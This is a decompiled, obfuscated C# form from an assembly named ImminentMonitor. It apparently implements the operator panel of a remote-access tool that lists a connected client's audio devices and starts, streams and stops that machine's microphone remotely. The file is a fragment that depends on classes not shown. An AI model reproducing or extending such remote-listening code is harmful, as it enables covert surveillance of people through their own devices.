// Decompiled with JetBrains decompiler
// Type: FormMicrophone
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormMicrophone : Form
{
  private IContainer icontainer_0;
  public GClass18 gclass18_0;
  public GClass5 gclass5_0;
  public bool bool_0;
  private GClass12 gclass12_0;
  private bool bool_1;
  private ChromiumWebBrowser chromiumWebBrowser_0;

  public FormMicrophone(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.FormMicrophone_Load);
    this.FormClosing += new FormClosingEventHandler(this.FormMicrophone_FormClosing);
    this.bool_0 = false;
    this.bool_1 = false;
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.gclass18_0.method_20().formMicrophone_0 = this;
    this.method_0();
    this.Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.MinimumSize = new Size(680, 682);
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormMicrophone));
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.ClientSize = new Size(664, 643);
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.ForeColor = SystemColors.ControlText;
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormMicrophone);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X Microphone Chat";
    this.ResumeLayout(false);
  }

  private virtual GClass12 vmethod_0() => this.gclass12_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  private virtual void vmethod_1(GClass12 gclass12_1)
  {
    GDelegate0 gdelegate0_1 = new GDelegate0(this.method_8);
    if (this.gclass12_0 != null)
      this.gclass12_0.method_14(gdelegate0_1);
    this.gclass12_0 = gclass12_1;
    if (this.gclass12_0 == null)
      return;
    this.gclass12_0.method_13(gdelegate0_1);
  }

  public virtual ChromiumWebBrowser vmethod_2() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_3(ChromiumWebBrowser chromiumWebBrowser_1) => this.chromiumWebBrowser_0 = chromiumWebBrowser_1;

  private void method_0()
  {
    Class97.smethod_28((Form) this);
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\mic-chat.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      this.Close();
    }
    this.vmethod_3(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_2()).AllowDrop = false;
    ((Control) this.vmethod_2()).Dock = DockStyle.Fill;
    this.Controls.Add((Control) this.vmethod_2());
    this.vmethod_2().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_2().RegisterJsObject("microphoneChat", (object) new MicCefHandler(this), (BindingOptions) null);
  }

  protected override void WndProc(ref Message m)
  {
    base.WndProc(ref m);
    if (m.Msg != Class97.int_0 || (int) m.WParam != Class97.int_3)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_2());
  }

  public GClass0[] method_1() => GClass12.smethod_0();

  public GClass31[] method_2() => GClass5.smethod_0();

  private void FormMicrophone_Load(object sender, EventArgs e) => this.gclass18_0.method_20().formMicrophone_0 = this;

  private void FormMicrophone_FormClosing(object sender, FormClosingEventArgs e)
  {
    this.bool_0 = false;
    this.gclass5_0 = (GClass5) null;
    this.vmethod_1((GClass12) null);
    this.method_6();
  }

  public void method_3(byte[] byte_0)
  {
    byte_0 = GClass23.smethod_1(byte_0, 0, byte_0.Length);
    if (this.gclass5_0 == null)
      return;
    this.gclass5_0.method_2(byte_0, 0, byte_0.Length);
  }

  public void method_4(object[] object_0)
  {
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; ++index)
    {
      if (Conversions.ToDouble(object_0[index].ToString().Split(Conversions.ToCharArrayRankOne("|"))[0]) == 0.0)
        Class97.smethod_20(this.vmethod_2(), string.Format("addClientAudioInput('{0}')", (object) Class97.smethod_21(object_0[index].ToString().Split(Conversions.ToCharArrayRankOne("|"))[1])));
      else
        Class97.smethod_20(this.vmethod_2(), string.Format("addClientAudioOutput('{0}')", (object) Class97.smethod_21(object_0[index].ToString().Split(Conversions.ToCharArrayRankOne("|"))[1])));
    }
  }

  private void method_5(byte[] byte_0)
  {
    byte_0 = GClass23.smethod_0(byte_0, 0, byte_0.Length);
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Microphone,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket.SendStream,
      (object) byte_0
    });
  }

  public void method_6() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Microphone,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket.StopStream
  });

  public void method_7(int int_0, int int_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Microphone,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket.Initialize,
    (object) int_0,
    (object) int_1
  });

  private void method_8(byte[] byte_0)
  {
    if (!this.bool_1 || !this.bool_0)
      return;
    this.method_5(byte_0);
  }

  public void method_9(int int_0, int int_1, int int_2)
  {
    this.bool_0 = true;
    this.gclass5_0 = new GClass5(GClass5.smethod_0()[int_2], 8000, 16, 1);
    this.method_7(int_0, int_1);
  }

  public void method_10()
  {
    this.bool_0 = false;
    this.gclass5_0 = (GClass5) null;
    this.method_6();
  }

  public void method_11(bool bool_2, int int_0)
  {
    if (bool_2)
    {
      this.vmethod_1(new GClass12(GClass12.smethod_0()[int_0], 8000, 16, 1, 400));
      this.vmethod_0().method_1();
      this.bool_1 = true;
    }
    else
    {
      this.vmethod_0().method_2();
      this.vmethod_1((GClass12) null);
      this.bool_1 = false;
    }
  }
}
